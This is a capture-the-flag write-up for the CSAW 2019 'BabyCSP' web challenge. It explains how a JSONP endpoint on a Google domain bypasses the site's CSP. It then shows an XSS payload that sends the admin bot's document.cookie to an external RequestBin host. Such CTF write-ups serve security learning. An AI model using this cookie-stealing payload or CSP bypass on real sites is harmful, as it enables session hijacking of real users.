# BabyCSP writeup - 50pts

## What we have
The chall provide us with a link to a very basic website:

![Screenshot of the challenge website](https://github.com/jacopotediosi/Writeups/blob/master/CTF/CSAW-Quals-2019/Web/BabyCSP-50/Screenshots/1.jpg?raw=true)

We can create posts, view them and report them to an admin. Nice!

On the top of the website, we can see the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) rules used:

    default-src 'self'; script-src 'self' *.google.com; connect-src *

Maybe we can do an XSS and steal the bot/admin cookies? But first, we need to discover how to bypass CSP in order to execute arbitrary javascript on clients.

## CSP Bypass
First of all, I tried to analyze the chall CSP rules with the [Google CSP Evaluator Tool](https://csp-evaluator.withgoogle.com/):

![The Google CSP Evaluetor Tool Analysis](https://github.com/jacopotediosi/Writeups/blob/master/CTF/CSAW-Quals-2019/Web/BabyCSP-50/Screenshots/2.jpg?raw=true)

Seems good: we can use a JSONP endpoint to bypass CSP.

Searching on the web, I found a list of endpoints on *.google.com [here](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt).

I chose to use this endpoint: https://accounts.google.com/o/oauth2/revoke?callback=YOUR-JAVASCRIPT-HERE

So, now, we can try to inject javascript including this link as a script inside posts.

## Stealing admin cookies
I wrote, just to try, the following post:
`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>` and a nice popup appeared when I opened the post.

Someone here forgot to sanitize inputs :P

![XSS executed!](https://github.com/jacopotediosi/Writeups/blob/master/CTF/CSAW-Quals-2019/Web/BabyCSP-50/Screenshots/3.jpg?raw=true)

I then prepared a [RequestBin](https://requestbin.com) to receive admin cookies, I created a post with the following payload (everything after "callback=" is urlencoded, just to be sure):

    <script src="https://accounts.google.com/o/oauth2/revoke?callback=window.location.href%3D%27https%3A%2F%2Fen5pzvwnw7lrc.x.pipedream.net%3Fa%3D%27%2Bdocument.cookie%3B"></script>

And I reported it to the admin.

Fewer minutes later, I received this request directly containing the flag:
![Screenshot of the request received, containing the flag](https://github.com/jacopotediosi/Writeups/blob/master/CTF/CSAW-Quals-2019/Web/BabyCSP-50/Screenshots/4.jpg?raw=true)
